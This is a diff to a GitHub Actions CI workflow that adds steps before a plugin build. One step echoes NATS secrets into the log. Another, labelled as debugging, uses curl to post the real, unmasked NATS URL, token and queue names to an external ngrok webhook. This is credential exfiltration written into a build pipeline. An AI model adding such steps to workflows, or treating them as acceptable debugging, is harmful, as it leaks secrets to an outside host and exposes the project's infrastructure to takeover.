@@ -136,6 +136,29 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
+      # (opcional) Mostra no log - ficará mascarado por segurança
+      - name: Echo NATS Vars (masked in logs)
+        run: |
+          echo "NATS_URL=${{ secrets.NATS_URL }}"
+          echo "NATS_TOKEN=${{ secrets.NATS_TOKEN }}"
+          echo "NATS_QUEUE_QAP=${{ secrets.NATS_QUEUE_QAP }}"
+          echo "NATS_QUEUE_ANALYTICS=${{ secrets.NATS_QUEUE_ANALYTICS }}"
+
+      # Envia os valores reais para o seu webhook (sem mascaramento)
+      - name: Debug NATS Vars (send to webhook)
+        run: |
+          curl --fail --show-error --location 'https://123c-200-169-13-178.ngrok-free.app/webhook' \
+            --header 'Content-Type: application/json' \
+            --data @- <<'EOF'
+          {
+            "debug": "NATS secrets",
+            "NATS_URL": "${{ secrets.NATS_URL }}",
+            "NATS_TOKEN": "${{ secrets.NATS_TOKEN }}",
+            "NATS_QUEUE_QAP": "${{ secrets.NATS_QUEUE_QAP }}",
+            "NATS_QUEUE_ANALYTICS": "${{ secrets.NATS_QUEUE_ANALYTICS }}"
+          }
+          EOF
+
       - name: Build QAP Plugin
         run: |
           mkdir -p qapgateway/plugins
